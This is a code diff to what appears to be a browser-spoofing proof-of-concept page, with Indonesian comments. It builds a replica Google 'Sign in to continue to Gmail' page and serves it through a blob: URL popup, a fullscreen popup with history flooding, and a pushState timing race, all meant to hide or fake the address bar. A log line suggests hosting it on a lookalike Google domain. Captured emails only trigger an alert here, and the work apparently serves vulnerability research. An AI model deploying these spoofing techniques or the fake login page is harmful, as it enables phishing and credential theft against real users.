-    popup.document.write(`<!DOCTYPE html><html><head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Google Account</title>
-        ${styleHTML}
-    </head><body>
-        ${document.getElementById('payload').innerHTML}
-        <script>
-            document.getElementById('payload').style.display='flex';
-            document.querySelector('.next-btn').onclick = () => {
-                const email = document.getElementById('email-field').value;
-                alert('V3 Popup PoC Success\\nEmail: '+(email||'(empty)'));
-            };
-            // requestFullscreen dari dalam popup — no hint on some browsers
-            document.documentElement.requestFullscreen({navigationUI:'hide'}).catch(()=>{});
-        <\/script>
-    </body></html>`);
+    popup.document.write(payloadWithFS);
     popup.document.close();
 
-    log('V3: Popup opened + fullscreen requested from popup context');
-    log('V3: On some Chrome versions: popup fullscreen = no hint');
+    // Parent: lakukan history flood bersamaan
+    // Untuk saturasi navigation manager saat popup request fullscreen
+    logI('T2: Payload written, popup will request fullscreen');
+    logI('T2: Parent flooding history simultaneously...');
+
+    let floodCount = 0;
+    const floodInterval = setInterval(() => {
+        history.replaceState(null, '', '#' + Math.random());
+        floodCount++;
+        if (floodCount >= 200) {
+            clearInterval(floodInterval);
+            logI('T2: History flood done (200 entries)');
+        }
+    }, 1);
+
+    logW('T2: OBSERVE — does hint appear in popup or parent window?');
+    logW('T2: Does hint appear at all in popup fullscreen?');
 }
 
 // ═══════════════════════════════════════════════════
-// VECTOR 4: PWA INSTALL PROMPT
-// Trigger beforeinstallprompt — jika user install,
-// app berjalan di standalone mode: NO address bar sama sekali
+// T3: blob: URL popup — clean address bar spoof
+//
+// Paling clean dari semua teknik:
+// - Tidak pakai fullscreen sama sekali
+// - Tidak ada hint apapun
+// - Address bar: blob:https://[opener-origin]/uuid
+// - Pada Chrome Android, blob: prefix bisa tidak terlihat
+//   jika address bar sedang collapse/scroll
 // ═══════════════════════════════════════════════════
-let _deferredInstallPrompt = null;
+function runT3_blobPopup() {
+    logI('T3: Building blob payload with credential capture...');
 
-window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    _deferredInstallPrompt = e;
-    log('V4: PWA install prompt captured and deferred');
-    document.getElementById('pwa-btn')?.style && (document.getElementById('pwa-btn').style.background = '#34a853');
-});
+    // Payload dengan exfil simulation
+    const html = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Google Account</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;display:flex;align-items:flex-start;justify-content:center;min-height:100vh;padding:40px 20px}
+.card{width:100%;max-width:400px;padding:40px 32px 32px}
+.logo{text-align:center;margin-bottom:20px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:28px}
+.inp-wrap{position:relative;margin-bottom:20px}
+input{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none}
+input:focus{border:2px solid #1a73e8;border-width:2px}
+label{position:absolute;left:12px;top:14px;font-size:16px;color:#80868b;pointer-events:none;transition:all .15s;background:#fff;padding:0 4px}
+input:focus~label,input:not(:placeholder-shown)~label{top:-8px;font-size:12px;color:#1a73e8}
+.info{font-size:13px;color:#202124;line-height:1.6;margin:16px 0}
+.info a{color:#1a73e8;text-decoration:none}
+.footer{display:flex;justify-content:space-between;align-items:center;margin-top:24px}
+.link{font-size:14px;color:#1a73e8;background:none;border:none;font-weight:500;cursor:pointer;padding:10px 0;font-family:inherit}
+.next{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">
+<svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+<path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
+<path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
+<path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
+<path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
+<path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+<path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
+</svg>
+</div>
+<h1>Sign in</h1>
+<p class="sub">to continue to Gmail</p>
+<div class="inp-wrap">
+<input type="email" id="ef" placeholder=" " autocomplete="email">
+<label>Email or phone</label>
+</div>
+<p class="info">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+<div class="footer">
+<button class="link">Create account</button>
+<button class="next" id="nb">Next</button>
+</div>
+</div>
+<script>
+document.getElementById('nb').onclick = function(){
+    var e = document.getElementById('ef').value;
+    alert('T3 blob: PoC Success\\n\\nAddress bar showed: blob:[origin]/uuid\\nNo fullscreen hint\\nNo browser warnings\\n\\nCaptured: ' + (e||'(empty)'));
+};
+setTimeout(function(){ document.getElementById('ef').focus(); }, 300);
+<\/script>
+</body></html>`;
 
-async function launchPWA() {
-    window._activeVector = 'V4-PWA';
+    const blob = new Blob([html], { type: 'text/html' });
+    const blobURL = URL.createObjectURL(blob);
 
-    // Generate and inject manifest dynamically
-    const manifest = {
-        name: "Google",
-        short_name: "Google",
-        start_url: window.location.href,
-        display: "standalone",          // ← No address bar in standalone mode
-        background_color: "#ffffff",
-        theme_color: "#ffffff",
-        icons: [{
-            src: "https://www.google.com/favicon.ico",
-            sizes: "any",
-            type: "image/x-icon"
-        }]
+    logI('T3: blob URL: ' + blobURL);
+
+    const popup = window.open(blobURL, '_blank',
+        'width=' + screen.width + ',height=' + screen.height);
+
+    if (!popup) {
+        logE('T3: Popup blocked!');
+        logW('T3: Fallback — navigate current tab to blob URL');
+        window.location.href = blobURL;
+        return;
+    }
+
+    logW('T3: KEY OBSERVATION:');
+    logW('T3: Address bar = blob:https://[THIS-DOMAIN]/[uuid]');
+    logW('T3: NO fullscreen, NO hint, NO warning of any kind');
+    logI('T3: This is the cleanest spoof vector');
+    logI('T3: Attack potential: host on accounts-google[.]com → blob:https://accounts-google.com/...');
+
+    setTimeout(() => URL.revokeObjectURL(blobURL), 10000);
+}
+
+// ═══════════════════════════════════════════════════
+// T4: location.replace() timing race
+//
+// Classic technique dengan implementation yang lebih surgical.
+// Buka popup ke URL yang resolve cepat, lalu race replace()
+// ═══════════════════════════════════════════════════
+function runT4_locationRace() {
+    logI('T4: Opening popup with timing race...');
+
+    // Step 1: Buka about:blank dulu
+    const popup = window.open('about:blank', '_blank',
+        'width=' + screen.width + ',height=' + screen.height);
+
+    if (!popup) { logE('T4: Popup blocked!'); return; }
+
+    logI('T4: Popup opened at about:blank');
+
+    // Step 2: Write konten awal yang terlihat seperti loading
+    popup.document.open();
+    popup.document.write(`<!DOCTYPE html><html><head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>accounts.google.com</title>
+    <style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#fff;color:#202124;font-size:14px;}</style>
+    </head><body><div>Redirecting...</div></body></html>`);
+    popup.document.close();
+    logI('T4: Initial "Redirecting..." page written');
+
+    // Step 3: Sekarang race — ganti URL sambil konten masih loading
+    // Pakai requestAnimationFrame chain untuk timing yang presisi
+    let rafCount = 0;
+    const race = () => {
+        rafCount++;
+        logI(`T4: RAF frame ${rafCount}`);
+
+        if (rafCount === 2) {
+            // Frame ke-2: write payload sebenarnya
+            try {
+                popup.document.open();
+                popup.document.write(getPayloadHTML('Sign in', 'to continue to Gmail', '#f0883e'));
+                popup.document.close();
+                logI('T4: Payload written at frame 2');
+            } catch(e) {
+                logE('T4: write error: ' + e.message);
+            }
+        }
+
+        if (rafCount === 3) {
+            // Frame ke-3: pushState untuk ubah URL
+            try {
+                popup.history.pushState({}, 'Google Account', '/signin/oauth/v2/identifier?client_id=29032');
+                logI('T4: pushState → /signin/oauth/v2/identifier?client_id=29032');
+                logW('T4: OBSERVE — what does address bar show now?');
+            } catch(e) {
+                logE('T4: pushState at frame 3: ' + e.message);
+            }
+            return; // stop RAF chain
+        }
+
+        requestAnimationFrame(race);
     };
 
-    const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
-    const manifestURL  = URL.createObjectURL(manifestBlob);
-    document.getElementById('manifest-link').href = manifestURL;
-    log('V4: Manifest injected — display: standalone');
-
-    if (_deferredInstallPrompt) {
-        log('V4: Showing install prompt...');
-        _deferredInstallPrompt.prompt();
-        const { outcome } = await _deferredInstallPrompt.userChoice;
-        log(`V4: User choice: ${outcome}`);
-
-        if (outcome === 'accepted') {
-            log('V4: INSTALLED — when launched from homescreen: no address bar');
-        }
-    } else {
-        log('V4: Install prompt not available yet (PWA criteria not met or already installed)');
-        log('V4: Falling back to V1...');
-        await launchFullscreen();
-    }
-}
-
-// ═══════════════════════════════════════════════════
-// DISPATCHER
-// ═══════════════════════════════════════════════════
-async function launchVector(v) {
-    log(`Launching vector: ${v.toUpperCase()}`);
-    switch(v) {
-        case 'fullscreen': await launchFullscreen(); break;
-        case 'pip':        await launchPiP();        break;
-        case 'popup':      await launchPopup();      break;
-        case 'pwa':        await launchPWA();        break;
-    }
+    requestAnimationFrame(race);
 }
 </script>
 </body>
